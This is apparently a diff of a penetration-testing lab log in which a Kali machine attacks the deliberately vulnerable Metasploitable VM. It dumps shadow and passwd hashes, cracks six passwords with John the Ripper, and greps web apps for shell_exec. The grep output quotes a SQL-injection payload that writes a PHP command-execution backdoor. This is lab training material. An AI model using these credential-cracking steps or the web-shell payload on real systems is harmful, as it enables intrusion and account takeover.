+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+snmp:*:15480:0:99999:7:::
+root@metasploitable:/home/msfadmin# 
+
+root@kali:~/Desktop# unshadow passwd shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+bin:*:2:2:bin:/bin:/bin/sh
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/bin/sh
+man:*:6:12:man:/var/cache/man:/bin/sh
+lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+mail:*:8:8:mail:/var/mail:/bin/sh
+news:*:9:9:news:/var/spool/news:/bin/sh
+uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:*:13:13:proxy:/bin:/bin/sh
+www-data:*:33:33:www-data:/var/www:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:!:100:101::/var/lib/libuuid:/bin/sh
+dhcp:*:101:102::/nonexistent:/bin/false
+syslog:*:102:103::/home/syslog:/bin/false
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:*:105:113::/var/cache/bind:/bin/false
+postfix:*:106:115::/var/spool/postfix:/bin/false
+ftp:*:107:65534::/home/ftp:/bin/false
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:*:111:65534::/:/bin/false
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+telnetd:*:112:120::/nonexistent:/bin/false
+proftpd:!:113:65534::/var/run/proftpd:/bin/false
+statd:*:114:65534::/var/lib/nfs:/bin/false
+snmp:*:115:65534::/var/lib/snmp:/bin/false
+root@kali:~/Desktop# 
+
+root@kali:~/Desktop# john -show unshadow_out
+sys:batman:3:3:sys:/dev:/bin/sh
+klog:123456789:103:104::/home/klog:/bin/false
+msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:service:1002:1002:,,,:/home/service:/bin/bash
+
+6 password hashes cracked, 1 left
+root@kali:~/Desktop# 
+
+Look for common web vulnerabilities and backdoors
+root@metasploitable:/home/msfadmin# grep -Rn "shell_exec *(" /var/www
+/var/www/dvwa/vulnerabilities/exec/source/medium.php:18:		$cmd = shell_exec( 'ping  ' . $target );
+/var/www/dvwa/vulnerabilities/exec/source/medium.php:23:		$cmd = shell_exec( 'ping  -c 3 ' . $target );
+/var/www/dvwa/vulnerabilities/exec/source/low.php:10:		$cmd = shell_exec( 'ping  ' . $target );
+/var/www/dvwa/vulnerabilities/exec/source/low.php:15:		$cmd = shell_exec( 'ping  -c 3 ' . $target );
+/var/www/dvwa/vulnerabilities/exec/source/high.php:23:			$cmd = shell_exec( 'ping  ' . $target );
+/var/www/dvwa/vulnerabilities/exec/source/high.php:28:			$cmd = shell_exec( 'ping  -c 3 ' . $target );
+/var/www/mutillidae/inc:3319:    			echo shell_exec("nslookup " . $targethost);
+/var/www/mutillidae/dns-lookup.php:124:    			echo shell_exec("nslookup " . $targethost);
+/var/www/mutillidae/documentation/Mutillidae-Test-Scripts.txt:644:		' union select null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' -- 
+/var/www/mutillidae/documentation/Mutillidae-Test-Scripts.txt:666:	echo shell_exec($_REQUEST["pCommand"]);
+/var/www/mutillidae/documentation/Mutillidae-Test-Scripts.txt:670:<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>
+/var/www/mutillidae/owasp-esapi-php/src/reference/DefaultExecutor.php:148:            $output = shell_exec($executable . $paramstr);    
+/var/www/tikiwiki-old/tiki-map_upload.php:194:	      $return=shell_exec($command);
+/var/www/tikiwiki-old/lib/sheet/include/org/apicnet/io/OOo/objOOo/OOoImg.php:124:		$result = shell_exec(APIC_LIBRARY_PATH."/org/apicnet/io/OOo/objOOo/Taille.exe ".$dir."/Pictures/".$tmpfile);
+/var/www/tikiwiki/tiki-map_upload.php:191:	      $return=shell_exec($command);
+/var/www/tikiwiki/lib/sheet/include/org/apicnet/io/OOo/objOOo/OOoImg.php:124:		$result = shell_exec(APIC_LIBRARY_PATH."/org/apicnet/io/OOo/objOOo/Taille.exe ".$dir."/Pictures/".$tmpfile);
+root@metasploitable:/home/msfadmin# 
